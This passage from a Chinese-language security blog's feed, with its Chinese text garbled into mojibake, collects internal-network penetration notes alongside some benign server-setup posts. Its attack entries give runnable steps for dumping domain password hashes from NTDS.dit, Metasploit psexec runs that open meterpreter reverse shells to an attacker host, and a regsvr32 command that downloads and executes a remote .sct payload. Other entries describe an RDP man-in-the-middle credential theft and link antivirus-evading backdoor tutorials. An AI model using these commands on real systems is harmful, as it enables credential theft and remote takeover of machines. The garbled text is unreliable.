ä»¥ç®¡ç†å‘˜èº«ä»½æ‰“å¼€å‘½ä»¤æç¤ºç¬¦ï¼ˆcmd.exeï¼‰ã€‚è¦ä»¥ç®¡ç†å‘˜èº«ä»½æ‰“å¼€å‘½ä»¤æç¤ºç¬¦ï¼Œè¯·å•å‡»â€œå¯åŠ¨â€ã€‚åœ¨â€œå¼€å§‹æœç´¢â€ä¸­ï¼Œé”®å…¥å‘½ä»¤æç¤ºç¬¦ã€‚åœ¨â€œå¼€å§‹â€èœå•çš„é¡¶éƒ¨ï¼Œå³é”®å•å‡»â€œå‘½ä»¤æç¤ºç¬¦â€ï¼Œç„¶åŽå•å‡»â€œä»¥ç®¡ç†å‘˜èº«ä»½è¿è¡Œâ€ã€‚å¦‚æžœå‡ºçŽ°â€œç”¨æˆ·å¸æˆ·æŽ§åˆ¶â€å¯¹è¯æ¡†ï¼Œè¯·è¾“å…¥ç›¸åº”çš„å‡­æ®ï¼ˆå¦‚æžœå·²è¯·æ±‚ï¼‰å¹¶ç¡®è®¤å…¶æ˜¾ç¤ºçš„æ“ä½œæ˜¯æ‚¨æ‰€éœ€çš„æ“ä½œï¼Œç„¶åŽå•å‡»â€œç»§ç»­â€ã€‚ åœ¨å‘½ä»¤æç¤ºç¬¦ä¸‹ï¼Œé”®å…¥ä»¥ä¸‹å‘½ä»¤ï¼Œç„¶åŽæŒ‰ENTERé”®ï¼š 1ntdsutil åœ¨ntdsutilæç¤ºç¬¦ä¸‹ï¼Œé”®å…¥ä»¥ä¸‹å‘½ä»¤ï¼Œç„¶åŽæŒ‰Enterï¼š 1activate instance ntds åœ¨ntdsutilæç¤ºç¬¦ä¸‹ï¼Œé”®å…¥ä»¥ä¸‹å‘½ä»¤ï¼Œç„¶åŽæŒ‰Enterï¼š 1ifm åœ¨ifmæç¤ºç¬¦ä¸‹ï¼Œé”®å…¥ä»¥ä¸‹å‘½ä»¤ï¼Œç„¶åŽæŒ‰Enterï¼š 1create full &lt;Drive&gt;:\&lt;Folder&gt; &lt;Drive&gt;:\&lt;Folder&gt; æ˜¯è¦åˆ›å»ºçš„æ–‡ä»¶çš„æ–‡ä»¶å¤¹è·¯å¾„ã€‚ ä¾‹å¦‚ï¼Œä»¥ä¸‹å‘½ä»¤å°†æ˜¾ç¤ºç»Ÿè®¡ä¿¡æ¯ï¼Œè¾“å‡ºpwdump.txtåŒ…å«å¯†ç å“ˆå¸Œå€¼çš„æ–‡ä»¶ï¼Œå¹¶è¾“å‡ºusers.csvåŒ…å«æ¯ä¸ªç”¨æˆ·å¸æˆ·è¯¦ç»†ä¿¡æ¯çš„æ–‡ä»¶ã€‚ 1ntdsaudit ntds.dit -s SYSTEM -p pwdump.txt -u users.csv Linux æ˜Žæ–‡å¯†ç çš„èŽ·å–mimipenguin git clone https://github.com/huntergregal/mimipenguin æ”¯æŒçš„æ“ä½œç³»ç»Ÿ os service supported Ubuntu Desktop 12.04 LTS x64 gnome-keyring-daemon (3.18.3) Y Ubuntu Desktop 16.04 LTS x64 gnome-keyring-daemon (3.18.3) Y Fedora Workstation 25 (x86_64) gnome-keyring-daemon (3.20.0) Y Fedora Workstation 27 (x86_64) gnome-keyring-daemon (3.20.1) Y Kali-rolling x64 gnome-keyring-daemon (3.28.0.2) Y]]></content>
      <categories>
        <category>å†…ç½‘</category>
      </categories>
      <tags>
        <tag>åŸŸ</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[windows linux åº”æ€¥å“åº”æµç¨‹åŠå®žæˆ˜æ¼”ç»ƒ]]></title>
    <url>%2F2018%2F10%2F17%2Fwindows%20linux%20%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94.html</url>
    <content type="text"><![CDATA[å½“ä¼ä¸šå‘ç”Ÿé»‘å®¢å…¥ä¾µã€ç³»ç»Ÿå´©æºƒæˆ–å…¶å®ƒå½±å“ä¸šåŠ¡æ­£å¸¸è¿è¡Œçš„å®‰å…¨äº‹ä»¶æ—¶ï¼Œæ€¥éœ€ç¬¬ä¸€æ—¶é—´è¿›è¡Œå¤„ç†ï¼Œä½¿ä¼ä¸šçš„ç½‘ç»œä¿¡æ¯ç³»ç»Ÿåœ¨æœ€çŸ­æ—¶é—´å†…æ¢å¤æ­£å¸¸å·¥ä½œï¼Œè¿›ä¸€æ­¥æŸ¥æ‰¾å…¥ä¾µæ¥æºï¼Œè¿˜åŽŸå…¥ä¾µäº‹æ•…è¿‡ç¨‹ï¼ŒåŒæ—¶ç»™å‡ºè§£å†³æ–¹æ¡ˆä¸Žé˜²èŒƒæŽªæ–½ï¼Œä¸ºä¼ä¸šæŒ½å›žæˆ–å‡å°‘ç»æµŽæŸå¤±ã€‚ windows åº”æ€¥æµç¨‹åŠå®žæˆ˜æ¼”ç»ƒ Linux åº”æ€¥å“åº”æµç¨‹åŠå®žæˆ˜æ¼”ç»ƒ]]></content>
      <categories>
        <category>åº”æ€¥å“åº”</category>
      </categories>
      <tags>
        <tag>åº”æ€¥å“åº”</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[æ­å»ºåŸŸçŽ¯å¢ƒ]]></title>
    <url>%2F2018%2F10%2F16%2F%E5%9F%9F%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA.html</url>
    <content type="text"><![CDATA[åŸŸçŽ¯å¢ƒæ­å»º å‡†å¤‡ï¼š DC: Windows 2008 server R2 DM: Windows 2003 server SP2 Windows 2008 server R2 (åŸŸæŽ§) 1ã€ä¿®æ”¹è®¡ç®—æœºåï¼š å¯ä»¥æ”¹æˆDCæˆ–è€…å…¶ä»–ä»€ä¹ˆçœ‹ç€é¡ºçœ¼çš„åå­—ï¼Œé»˜è®¤ä¹Ÿè¡Œï¼Œå°±æ˜¯æ­å»ºå¥½åŸŸä»¥åŽå†æ”¹å¯èƒ½ä¼šé‡åˆ°ä¸€äº›é—®é¢˜ï¼› 2ã€é…ç½®å›ºå®šip: æˆ‘è™šæ‹Ÿæœºä½¿ç”¨çš„æ¡¥æŽ¥æ–¹å¼ï¼Œå¹¶ä¸”è·¯ç”±å™¨æ˜¯192.168.3.1ï¼Œæ‰€ä»¥åœ¨è¿™å¦‚æ­¤è®¾ç½®ï¼Œæ­¤å¤„çš„DNSå¡«å†™æœ¬æœºå³ï¼Œ127.0.0.1ï¼› 3ã€æœåŠ¡å™¨ç®¡ç†å™¨â€”è§’è‰²ï¼šå®‰è£…Active Directory åŸŸæœåŠ¡å¹¶ä¸”ä¼šåŒæ—¶è¦æ±‚å®‰è£…DNSæœåŠ¡å™¨ï¼› 4ã€é…ç½®åŸŸæœåŠ¡:æ‰“å¼€æœåŠ¡å™¨ç®¡ç†å™¨æˆ–è€…åœ¨è¿è¡Œæ¡†ä¸‹è¾“å…¥ dcpromoç›´æŽ¥è¿›è¡Œé…ç½®ï¼Œé€‰æ‹©æ–°å»ºï¼Œ Psï¼šè¿™é‡Œå¯èƒ½ä¼šå› ä¸ºæœ¬åœ°administratorçš„å¯†ç è§„åˆ™ä¸åˆè¦æ±‚ï¼Œå¯¼è‡´å®‰è£…å¤±è´¥ï¼Œæ”¹ä¸€ä¸ªå¼ºå¯†ç ï¼› 5ã€è®¾ç½®æž—æ ¹åŸŸï¼š æž—å°±æ˜¯åœ¨å¤šåŸŸæƒ…å†µä¸‹å½¢æˆçš„æ£®æž—,æ ¹è¡¨ç¤ºåŸºç¡€,å…¶ä»–åœ¨æ­¤æ ¹éƒ¨è¡ç”Ÿ å…·ä½“è§ï¼šhttp://angerfire.blog.51cto.com/198455/144123/ 6ã€åŸŸæ•°æ®å­˜æ”¾çš„åœ°å€ï¼šé»˜è®¤å³å¯ã€‚ DM: Windows 2003 server SP2 1ã€å¦‚æžœæ–°å®‰è£…çš„è™šæ‹Ÿæœºå®‰è£…æ—¶ä¼šæœ‰é€‰æ‹©é¡¹æ˜¯åŠ å…¥åŸŸè¿˜æ˜¯ç»„ï¼Œæˆ‘è¿™é‡Œé€‰æ‹©åŠ å…¥åŸŸï¼Œä¼šè®©ç™»å½•å½“å‰åŸŸçš„è´¦å·å¯†ç å³â€œDomaim\administratorâ€ï¼ˆå¿…é¡»æ˜¯åŸŸè´¦å·ä¸æ˜¯administratorï¼‰å’Œå¯¹åº”å¯†ç ï¼›å·²æœ‰çš„Windows2003åŠ å…¥åŸŸï¼Œé¦–å…ˆæ›´æ”¹ç»„ä¸ºåŸŸé€‰æ‹©æ­£ç¡®çš„domainå’Œdomainè´¦å·å¯†ç å³å¯ã€‚ 2ã€å®‰è£…æˆåŠŸåŽé…ç½®é™æ€IPï¼ŒDNSå¤„å¡«å†™DCçš„IPï¼› 3ã€åœ¨2003ä¸Šæ‰§è¡Œnet timeæ˜¾ç¤ºå¦‚å›¾ï¼Œè¯´æ˜Žå·²ç»åŠ å…¥åŸŸï¼Œå¹¶ä¸”åœ¨Windows2008ä¸Šçš„domain.comåŸŸï¼ŒæŽ§åˆ¶å™¨ä¸Šå¯ä»¥çœ‹åˆ°03çš„æœºå™¨ï¼› åŸŸå·²ç»æ­å»ºå®Œæˆï¼Œä¸»åŸŸæŽ§ä¼šç”Ÿæˆä¸€ä¸ª krbtgtè´¦å·ï¼Œä»–æ˜¯Windowsæ´»åŠ¨ç›®å½•ä¸­ä½¿ç”¨çš„å®¢æˆ·/æœåŠ¡å™¨è®¤è¯åè®®ï¼Œä¸ºé€šä¿¡åŒæ–¹æä¾›åŒå‘èº«ä»½è®¤è¯ã€‚]]></content>
      <categories>
        <category>å†…ç½‘</category>
      </categories>
      <tags>
        <tag>å†…ç½‘</tag>
        <tag>åŸŸ</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[é€šè¿‡MSFä½¿ç”¨SMBç«¯å£è¿œç¨‹è¿žæŽ¥ç›®æ ‡çš„æŠ€å·§]]></title>
    <url>%2F2018%2F10%2F16%2Fmsf%20smb.html</url>
    <content type="text"><![CDATA[å‰è¨€ å†…ç½‘æ¸—é€ä¸­èŽ·å¾—ç®¡ç†å‘˜ç”¨æˆ·åå¯†ç ä¹‹åŽï¼Œé€šè¿‡SMBç«¯å£445æ¥ä¸Žç›®æ ‡æœºå™¨çš„è®¾å¤‡å»ºç«‹è¿žæŽ¥çš„åŽæ¸—é€æŠ€å·§ã€‚ exploit/windows/smb/psexecmsf &gt; use exploit/windows/smb/psexecmsf exploit(windows/smb/psexec) &gt; set rhost 192.168.2.118msf exploit(windows/smb/psexec) &gt; set smbuser administratormsf exploit(windows/smb/psexec) &gt; set smbpass P@ssw0rdmsf exploit(windows/smb/psexec) &gt; set payload windows/meterpreter/reverse_tcpmsf exploit(windows/smb/psexec) &gt; set LHOST 192.168.2.145msf exploit(windows/smb/psexec) &gt; set LPORT 4444msf exploit(windows/smb/psexec) &gt; exploit æ‰§è¡ŒåŽæœ‰ä¸€ä¸ªsessionå›žè¿žç»å®žéªŒè¡¨æ˜Žï¼Œä½¿ç”¨æœ¬åœ°è´¦æˆ·å³ä½¿æ˜¯ç®¡ç†å‘˜æƒé™ä¹Ÿä¸èƒ½ä½¿ç”¨æ­¤æ–¹æ³•å¾—åˆ°ä¸€ä¸ª meterpreter ï¼Œåªèƒ½ä½¿ç”¨ administrator çš„ç”¨æˆ·åå¯†ç æ‰èƒ½å›žæ¥ä¸€ä¸ª session ï¼›å½“åœ¨åŸŸçŽ¯å¢ƒä½¿ç”¨æ—¶ï¼Œsmbuser ä¸æ˜¯å†™æˆdomain/administrator ï¼ˆè¿™æ ·çš„ç”¨æˆ·åæ˜¯Exploit failed æ‰§è¡Œä¸æˆåŠŸçš„ï¼‰è€Œæ˜¯å†™æˆ administrator ï¼Œå¹¶ä¸”åªè¦æ˜¯åŸŸç®¡ç†å‘˜éƒ½èƒ½æ‰§è¡ŒæˆåŠŸå¹¶åå¼¹ä¸€ä¸ª meterpreter çš„ session ã€‚ exploit/windows/smb/psexec_pshmsf &gt; use exploit/windows/smb/psexec_pshmsf exploit(windows/smb/psexec_psh) &gt; set rhost 192.168.2.118msf exploit(windows/smb/psexec_psh) &gt; set smbuser administratormsf exploit(windows/smb/psexec_psh) &gt; set smbpass P@ssw0rdmsf exploit(windows/smb/psexec_psh) &gt; set payload windows/meterpreter/reverse_tcpmsf exploit(windows/smb/psexec_psh) &gt; set lhost 192.168.2.145msf exploit(windows/smb/psexec_psh) &gt; set lport 4444msf exploit(windows/smb/psexec_psh) &gt; exploit exploit/multi/script/web_deliveryä½¿ç”¨exploit/multi/script/web_delivery ç”Ÿæˆæ¶æ„dllä»£ç  12345678910111213141516171819202122msf &gt; use exploit/multi/script/web_delivery msf exploit(multi/script/web_delivery) &gt; show targets Exploit targets: Id Name--- 0 Python 1 PHP 2 PSH 3 Regsvr32 4 PSH (Binary)msf exploit(multi/script/web_delivery) &gt; set target 3msf exploit(multi/script/web_delivery) &gt; set payload windows/meterpreter/reverse_tcpmsf exploit(multi/script/web_delivery) &gt; set lhost 192.168.2.145msf exploit(multi/script/web_delivery) &gt; set lport 4444msf exploit(multi/script/web_delivery) &gt; exploit [*] Exploit running as background job 0.[*] Started reverse TCP handler on 192.168.2.145:4444 [*] Using URL: http://0.0.0.0:8080/s7sa27EEtl[*] Local IP: http://192.168.2.145:8080/s7sa27EEtl[*] Server started.[*] Run the following command on the target machine:regsvr32 /s /n /u /i:http://192.168.2.145:8080/s7sa27EEtl.sct scrobj.dll auxiliary/admin/smb/psexec_commandä½¿ç”¨ auxiliary/admin/smb/psexec_command åœ¨è¿œç¨‹ç›®æ ‡ä¸Šæ‰§è¡Œå‘½ä»¤ç§æ¶æ„ dll å›žè¿ž meterpreter ï¼›msf &gt; use auxiliary/admin/smb/psexec_commandmsf auxiliary(admin/smb/psexec_command) &gt; set rhosts 192.168.2.118msf auxiliary(admin/smb/psexec_command) &gt; set smbuser admin1msf auxiliary(admin/smb/psexec_command) &gt; set smbpass P@ssw0rdmsf auxiliary(admin/smb/psexec_command) &gt; set command regsvr32 /s /n /u /i:http://192.168.2.145:8080/s7sa27EEtl.sct scrobj.dllmsf auxiliary(admin/smb/psexec_command) &gt; set payload windows/meterpreter/reverse_tcpmsf auxiliary(admin/smb/psexec_command) &gt; set lhost 192.168.2.145msf auxiliary(admin/smb/psexec_command) &gt; set lport 4444msf auxiliary(admin/smb/psexec_command) &gt; exploit ç»å®žéªŒè¡¨æ˜Žï¼Œå½“ç›®æ ‡æœºå™¨æœ‰æ€æ¯’è½¯ä»¶çš„æ—¶å€™ï¼Œä¼šæ‹¦æˆªå…¶ä»ŽæœåŠ¡å™¨ä¸Šä¸‹è½½æ¶æ„ dll æ–‡ä»¶ s7sa27EEtl.sct ï¼ˆæµ‹è¯•æœºä¸ºèµ›é—¨é“å…‹æœªæŽˆæƒç‰ˆï¼‰ï¼Œæ¯•ç«Ÿ msf çš„æ¶æ„dll ç‰¹å¾ç å·²ç»è¢«æ€æ¯’å¼•æ“Žæ”¶å½•ï¼Œå¦‚æžœç¡®å®šç›®æ ‡æœºå…¶æ²¡æœ‰æ€è½¯ä¾¿å¯ä½¿ç”¨ã€‚ auxiliary/scanner/smb/impacket/wmiexecmsf auxiliary(admin/smb/psexec_command) &gt; use auxiliary/scanner/smb/impacket/wmiexecmsf auxiliary(scanner/smb/impacket/wmiexec) &gt; set rhosts 192.168.2.118msf auxiliary(scanner/smb/impacket/wmiexec) &gt; set smbuser admin1msf auxiliary(scanner/smb/impacket/wmiexec) &gt; set smbpass P@ssw0rdmsf auxiliary(scanner/smb/impacket/wmiexec) &gt; set command ipconfig /allmsf auxiliary(scanner/smb/impacket/wmiexec) &gt; exploit]]></content>
      <categories>
        <category>MSF</category>
      </categories>
      <tags>
        <tag>å†…ç½‘</tag>
        <tag>msf</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[CentOS 7 å®‰è£… Shadowscoks]]></title>
    <url>%2F2018%2F07%2F31%2FCentOS-7-%E5%AE%89%E8%A3%85-shadowscoks.html</url>
    <content type="text"><![CDATA[é¦–å…ˆå®‰è£… pip ï¼Œä½¿ç”¨ pip å®‰è£… Shadowsocks 1234yum updateyum upgradeyum install python-pippip install shadowsocks æ–°å»º Shadowsocks çš„é…ç½®æ–‡ä»¶ 1vim /etc/shadowsocks.json ç¼–è¾‘ Shadowocks é…ç½®æ–‡ä»¶ 12345678910&#123; "server":"0.0.0.0", "server_port":1111, "local_address":"127.0.0.1", "local_port":1080, "password":"yourpassword", "timeout":300, "method":"aes-256-cfb", "fast_open": false&#125; é…ç½®firewallï¼Œå…è®¸ Shadowsocks æœåŠ¡ç«¯å£è¢«å¤–ç½‘è®¿é—® 1234ä»¥ä¸‹å‘½ä»¤ä¼šæ°¸ä¹…ç”Ÿæ•ˆfirewall-cmd --zone=public --add-port=1111/tcp --permanenté‡æ–°è½½å…¥ firewallfirewall-cmd --reload å¯åŠ¨ ssserver æœåŠ¡ 123ssserver -c /etc/shadowsocks.json -d startssserver -c /etc/shadowsocks.json -d restartssserver -c /etc/shadowsocks.json -d stop]]></content>
      <categories>
        <category>vpsï¼ŒSS</category>
      </categories>
      <tags>
        <tag>CentOS</tag>
        <tag>shadowscoks</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[CentOS7 ä½¿ç”¨ Firewalld æ‰“å¼€å…³é—­é˜²ç«å¢™ä¸Žç«¯å£]]></title>
    <url>%2F2018%2F07%2F31%2FCentOS7_firewalld.html</url>
    <content type="text"><![CDATA[firewalldçš„åŸºæœ¬ä½¿ç”¨ 12345å¯åŠ¨ï¼š systemctl start firewalld ï¼ˆservice firewalld startï¼‰å…³é—­ï¼š systemctl stop firewalld ï¼ˆservice firewalld stopï¼‰æŸ¥çœ‹çŠ¶æ€ï¼š systemctl status firewalld å¼€æœºç¦ç”¨ ï¼š systemctl disable firewalldå¼€æœºå¯ç”¨ ï¼š systemctl enable firewalld systemctlæ˜¯CentOS7çš„æœåŠ¡ç®¡ç†å·¥å…·ä¸­ä¸»è¦çš„å·¥å…·ï¼Œå®ƒèžåˆä¹‹å‰serviceå’Œchkconfigçš„åŠŸèƒ½äºŽä¸€ä½“ã€‚123456789å¯åŠ¨ä¸€ä¸ªæœåŠ¡ï¼šsystemctl start firewalld.serviceå…³é—­ä¸€ä¸ªæœåŠ¡ï¼šsystemctl stop firewalld.serviceé‡å¯ä¸€ä¸ªæœåŠ¡ï¼šsystemctl restart firewalld.serviceæ˜¾ç¤ºä¸€ä¸ªæœåŠ¡çš„çŠ¶æ€ï¼šsystemctl status firewalld.serviceåœ¨å¼€æœºæ—¶å¯ç”¨ä¸€ä¸ªæœåŠ¡ï¼šsystemctl enable firewalld.serviceåœ¨å¼€æœºæ—¶ç¦ç”¨ä¸€ä¸ªæœåŠ¡ï¼šsystemctl disable firewalld.serviceæŸ¥çœ‹æœåŠ¡æ˜¯å¦å¼€æœºå¯åŠ¨ï¼šsystemctl is-enabled firewalld.serviceæŸ¥çœ‹å·²å¯åŠ¨çš„æœåŠ¡åˆ—è¡¨ï¼šsystemctl list-unit-files|grep enabledæŸ¥çœ‹å¯åŠ¨å¤±è´¥çš„æœåŠ¡åˆ—è¡¨ï¼šsystemctl --failed é…ç½®firewalld-cmd12345678910æŸ¥çœ‹ç‰ˆæœ¬ï¼š firewall-cmd --versionæŸ¥çœ‹å¸®åŠ©ï¼š firewall-cmd --helpæ˜¾ç¤ºçŠ¶æ€ï¼š firewall-cmd --stateæŸ¥çœ‹æ‰€æœ‰æ‰“å¼€çš„ç«¯å£ï¼š firewall-cmd --zone=public --list-portsæ›´æ–°é˜²ç«å¢™è§„åˆ™ï¼š firewall-cmd --reloadæŸ¥çœ‹åŒºåŸŸä¿¡æ¯: firewall-cmd --get-active-zonesæŸ¥çœ‹æŒ‡å®šæŽ¥å£æ‰€å±žåŒºåŸŸï¼š firewall-cmd --get-zone-of-interface=eth0æ‹’ç»æ‰€æœ‰åŒ…ï¼šfirewall-cmd --panic-onå–æ¶ˆæ‹’ç»çŠ¶æ€ï¼š firewall-cmd --panic-offæŸ¥çœ‹æ˜¯å¦æ‹’ç»ï¼š firewall-cmd --query-panic å¯¹ä¸€ä¸ªç«¯å£çš„å¼€å¯/æŸ¥çœ‹/åˆ é™¤æ“ä½œ1234æ·»åŠ : firewall-cmd --zone=public --add-port=444/tcp --permanent (--permanentæ°¸ä¹…ç”Ÿæ•ˆï¼Œæ²¡æœ‰æ­¤å‚æ•°é‡å¯åŽå¤±æ•ˆ)é‡æ–°è½½å…¥: firewall-cmd --reloadæŸ¥çœ‹: firewall-cmd --zone=public --query-port=444/tcpåˆ é™¤: firewall-cmd --zone=public --remove-port=444/tcp --permanent]]></content>
      <categories>
        <category>Linuxå‘½ä»¤</category>
      </categories>
      <tags>
        <tag>CentOS</tag>
        <tag>firewall</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[é€šè¿‡é™çº§è¿žæŽ¥åŠ«æŒRDPæ˜Žæ–‡å‡­æ®]]></title>
    <url>%2F2018%2F05%2F03%2Fseth.html</url>
    <content type="text"><![CDATA[Sethæ˜¯ä¸€ç§ç”¨Pythonå’ŒBashç¼–å†™çš„å·¥å…·ï¼Œç”¨äºŽé€šè¿‡å°è¯•é™çº§è¿žæŽ¥ä»¥æå–æ˜Žæ–‡å‡­æ®æ¥è¿›è¡ŒMitM RDPè¿žæŽ¥ã€‚å®ƒçš„å¼€å‘ç›®çš„æ˜¯ä¸ºäº†æé«˜è®¤è¯†ï¼Œå¹¶åœ¨ç¬”è¯•ï¼Œè®²ä¹ ç­æˆ–ä¼šè°ˆçš„èƒŒæ™¯ä¸‹æ•™è‚²æ­£ç¡®é…ç½®çš„RDPè¿žæŽ¥çš„é‡è¦æ€§ã€‚ä½œè€…æ˜¯Adrian Vollmerï¼ˆSySS GmbHï¼‰ã€‚ ç”¨æ³•ï¼š123456$ ./seth.sh &lt;INTERFACE&gt; &lt;ATTACKER IP&gt; &lt;VICTIM IP&gt; &lt;GATEWAY IP|HOST IP&gt; [&lt;COMMAND&gt;]å®žä¾‹ï¼š./seth.sh ç½‘å£ æ”»å‡»è€…IP è®¿é—®RDP IP è¢«æ”»å‡»è€…IP &lt;å‘½ä»¤æ‰§è¡Œä¸€èˆ¬ä¸ç”¨&gt;./seth.sh eth0 192.168.3.149 192.168.3.150 192.168.3.138ä¸Žä¸Šé¢å‘½ä»¤ç­‰ä»·ï¼ˆå¦‚æžœæ‰€æœ‰æœºå™¨åœ¨åŒä¸€ç½‘æ®µå¯ç”¨ï¼‰ï¼š./seth.sh eth0 192.168.3.&#123;149,150,138&#125; æµ‹è¯•ï¼š é¡¹ç›®åœ°å€ï¼šSeth æ”»å‡»è€…æœºå™¨ï¼škali 192.168.3.149 è®¿é—®RDPæœºå™¨ï¼šwin 7 x64 192.168.3.150 è¢«æ”»å‡»è€…æœºå™¨ï¼šwin 10 x64 192.168.3.138 æ¬ºéª—ARPå›žå¤ å¯ç”¨IPv4æµé‡è½¬å‘ï¼Œå°†æµé‡ä»Žå—å®³ä¸»æœºé‡å®šå‘åˆ°æ”»å‡»è€…æœºå™¨ï¼Œç„¶åŽå†è½¬å‘åˆ°ç›®æ ‡RDPæœåŠ¡å™¨ã€‚ é…ç½®ä¸€ä¸ªiptableè§„åˆ™æ‹’ç»SYNæ•°æ®åŒ…ï¼Œä»¥é˜²æ­¢ç›´æŽ¥çš„RDPè®¤è¯ã€‚ æ•èŽ·ç›®æ ‡ä¸»æœºçš„SYNæ•°æ®åŒ…ã€‚ å…‹éš†SSLè¯ä¹¦ã€‚é‡æ–°é…ç½®iptablesè§„åˆ™ï¼Œä»¥å°†æµé‡ä»Žå—å®³å·¥ä½œç«™è·¯ç”±åˆ°ç›®æ ‡RDPä¸»æœºã€‚ é˜»æ­¢åˆ°ç«¯å£88çš„æµé‡ï¼Œä»¥å°†Kerberosèº«ä»½éªŒè¯é™çº§åˆ°NTLMã€‚ seth æ‰§è¡Œå®Œçš„ç•Œé¢ï¼š è®¿é—®RDPçš„æœºå™¨å¼¹å‡ºï¼Œå°è¯•é€šè¿‡RDPå‘ç›®æ ‡æœåŠ¡å™¨è¿›è¡Œèº«ä»½éªŒè¯çš„ç”¨æˆ·å°†ä¼šæ”¶åˆ°ä»¥ä¸‹æ¶ˆæ¯ï¼š æˆåŠŸèŽ·å–è¢«æ”»å‡»è€…RDPçš„ç”¨æˆ·åå¯†ç ï¼š å½“ä»¥ä¸‹å¤é€‰æ¡†æœªé€‰ä¸­æ—¶è¢«æ”»å‡»è€…å¯ä»¥ç›´æŽ¥ç™»å½•ç³»ç»Ÿï¼Œå¹¶ä¸”sethå¯ä»¥è¿›è¡Œé”®ç›˜è®°å½•ã€‚ å¤‡æ³¨ï¼š å½“æˆ‘ä½¿ç”¨win 10 åšä¸ºè®¿é—®æ”»å‡»ç›®æ ‡RDPçš„æœºå™¨æ—¶ï¼Œwin 10 ç›´æŽ¥æŠ¥é”™ ï¼Œæ”»å‡»æœºå™¨æ˜¾ç¤ºç±»ä¼¼â€œè¯·ç¡®è®¤åŠ å¯†æ–¹å¼æ˜¯ä¸æ˜¯xxxâ€ï¼Œä¸èƒ½æŠ“åˆ°å¯†ç ï¼ˆä¹Ÿå¯èƒ½æ˜¯æˆ‘çŽ¯å¢ƒçš„é—®é¢˜ï¼‰ã€‚ ä½¿ç”¨win 7 åšä¸ºè®¿é—®æ”»å‡»ç›®æ ‡RDPçš„æœºå™¨ï¼Œå¼¹å‡ºsslè®¤è¯é‚£ä¸ªï¼ŒæœªæŠ¥é”™ï¼Œåªæ˜¯è¿›ä¸åŽ»mstscï¼Œé‡æ–°ç™»å½•å³å¯ï¼ˆæ”»å‡»æœºå·²ç»æ–­å¼€ç›‘å¬æ‰€ä»¥å¯ä»¥æ­£å¸¸ç™»å½•ï¼‰ã€‚ ä½¿ç”¨win 8 åšä¸ºè®¿é—®æ”»å‡»ç›®æ ‡RDPçš„æœºå™¨ï¼Œå¼¹å‡ºsslè®¤è¯é‚£ä¸ªï¼ŒæŠ¥é”™ï¼ˆä½†æ˜¯ä¸å½±å“ï¼Œç‚¹å‡»é‡æ–°ç™»å½•å³å¯ç™»å½•æˆåŠŸï¼‰ã€‚]]></content>
      <categories>
        <category>å†…ç½‘æ¸—é€</category>
        <category>RDPæ”»å‡»</category>
      </categories>
      <tags>
        <tag>å†…ç½‘æ¸—é€</tag>
        <tag>RDP</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[TheFatRat YouTube è§†é¢‘]]></title>
    <url>%2F2018%2F04%2F27%2Fbypass-av.html</url>
    <content type="text"><![CDATA[TheFatRat Screetsec Channel : https://www.youtube.com/channel/UCpK9IXzLMfVFp9NUfDzxFfw Udate thefatrat v1.8 https://youtu.be/6skLV6zPnec?list=PLbyfDadg3caj6nc3KBk375lKWDOjiCmb8 file Pumper in linux with fatrat https://youtu.be/rHuh5DJ476M?list=PLbyfDadg3caj6nc3KBk375lKWDOjiCmb8 Kali linux 2016.2 | Setup FatRat and Bypass Windows 10 :https://www.youtube.com/watch?v=mkfKSCxvPec Embed Backdoor Apk Andoird : https://www.youtube.com/watch?v=bZg3gPuLvgs&amp;feature=youtu.be Create Backdoor Php and Reconnect With TheFatRat : https://www.youtube.com/watch?v=gfS55fjd8Fg THEFATRAT:BACKDOOR CREATOR &amp; BYPASS ANTIVIRUS AND INSTALL. : https://www.youtube.com/watch?v=C4YHVKPw6Zo Exploit Windows 7/8/10 using Thefatrat ( option 2 ) : https://www.youtube.com/watch?v=-WbKOxIl_f4 How to hack android device with FatRat on kali linux 2 :https://www.youtube.com/watch?v=yUuwnu-NUXE Kali Linux Tools - TheFatRat Tool For Generate Backdoor with MsfVenom : https://www.youtube.com/watch?v=7PMfPbrM0o4 FUD 100 % Backdoor With TheFatRat pt.1 [ PwnWinds ][ Bypass Antivirus ] : https://www.youtube.com/watch?v=8lJBwclFwJI FUD 100 % Backdoor With TheFatRat pt.2 [ PwnWinds ][ Bypass Antivirus ] : https://www.youtube.com/watch?v=t7E6DZPhLLk&amp;t=17s FUD 100 % Backdoor With TheFatRat pt.3 [ PwnWinds ][ Bypass Antivirus ] : https://www.youtube.com/watch?v=wCzsD6vt9CQ TheFatrat Backdoor Undetectable by Antivirus Kali linux part 3 :https://www.youtube.com/watch?v=wuOCDn0NvWc 1000 % FUD Backdoor with TheFatRat Tool : https://www.youtube.com/watch?v=vPXWv0jaBEQ How To Use TheFatRat To Create Backdoor In Kali Rolling [FUD 100%] : https://www.youtube.com/watch?v=26tSOuPcpZk Backdoor (Virus) 100% Indetectable | TheFatRat : https://www.youtube.com/watch?v=26tSOuPcpZk Backdooring Android with TheFatRat Tool- Kali Linux Tutorial :https://www.youtube.com/watch?v=1SQW9lujjT8 Hacking Windows using TheFatRat + Apache2 Server + Ettercap + Metasploit on Kali Linux 2016.2 https://www.youtube.com/watch?v=FlXMslSjnGw TheFatRat 1.9.6 - Trodebi ( Embed Trojan into Debian Package ) https://youtu.be/NCsrcqhUBCc?list=PLbyfDadg3caj6nc3KBk375lKWDOjiCmb8 ALL VIDEO IN HERE : https://www.youtube.com/results?search_query=thefatrat+backdoor]]></content>
      <categories>
        <category>bypass-av</category>
        <category>å…æ€</category>
      </categories>
      <tags>
        <tag>å…æ€</tag>
        <tag>bypass-av</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Veil-Evasion + pyJoiner æ†ç»‘ä¸¤ä¸ª EXE çš„å…æ€æœ¨é©¬]]></title>
    <url>%2F2018%2F03%2F09%2Fveil%2BpyJoiner.html</url>
